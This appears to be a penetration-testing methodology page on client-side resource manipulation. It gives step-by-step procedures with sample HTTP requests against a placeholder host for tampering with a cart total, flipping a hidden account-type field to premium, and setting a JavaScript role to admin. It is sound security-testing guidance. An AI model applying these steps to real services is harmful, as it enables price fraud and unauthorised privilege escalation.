# Client Side Resource Manipulation

## Check List

## Methodology

### Black Box

#### JavaScript Price Manipulation

{% stepper %}
{% step %}
Login to your account
{% endstep %}

{% step %}
Open the product page and inspect client-side JavaScript
{% endstep %}

{% step %}
Identify pricing logic inside JS file

```http
GET /static/app.js HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
Locate price calculation function

```js
function calculateTotal(price, quantity){
   return price * quantity;
}
```
{% endstep %}

{% step %}
Add product to cart and intercept request

```http
POST /api/cart/update HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/json

{"productId":101,"quantity":1,"total":100}
```
{% endstep %}

{% step %}
Modify total value

```json
{"productId":101,"quantity":1,"total":1}
```
{% endstep %}

{% step %}
Forward the request, Proceed to checkout
{% endstep %}

{% step %}
If backend accepts manipulated total without recalculating server-side, client-side resource manipulation is confirmed
{% endstep %}
{% endstepper %}

***

#### Hidden Form Field Manipulation

{% stepper %}
{% step %}
Login as a normal user
{% endstep %}

{% step %}
Access profile update page, Inspect hidden input fields in HTML

```html
<input type="hidden" name="accountType" value="basic">
```
{% endstep %}

{% step %}
Intercept profile update request

```http
POST /profile/update HTTP/1.1
Host: target.com
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded

username=user1&accountType=basic
```
{% endstep %}

{% step %}
Modify hidden parameter

```http
username=user1&accountType=premium
```
{% endstep %}

{% step %}
Forward the request, If account privileges change based on modified hidden field without server validation, manipulation vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### JavaScript-Based Access Control

{% stepper %}
{% step %}
Login as normal user
{% endstep %}

{% step %}
Inspect JavaScript file for role-based UI control

```js
if(user.role === "admin"){
   showAdminPanel();
}
```
{% endstep %}

{% step %}
Manually modify role value in browser console

```js
user.role="admin"
showAdminPanel();
```
{% endstep %}

{% step %}
Access admin endpoint

```http
GET /api/admin/dashboard HTTP/1.1
Host: target.com
Cookie: session=abc123
```
{% endstep %}

{% step %}
If backend does not validate role and grants access based on client-side state, access control depends on client resources
{% endstep %}

{% step %}
If privilege escalation occurs due to client-side modification, resource manipulation vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
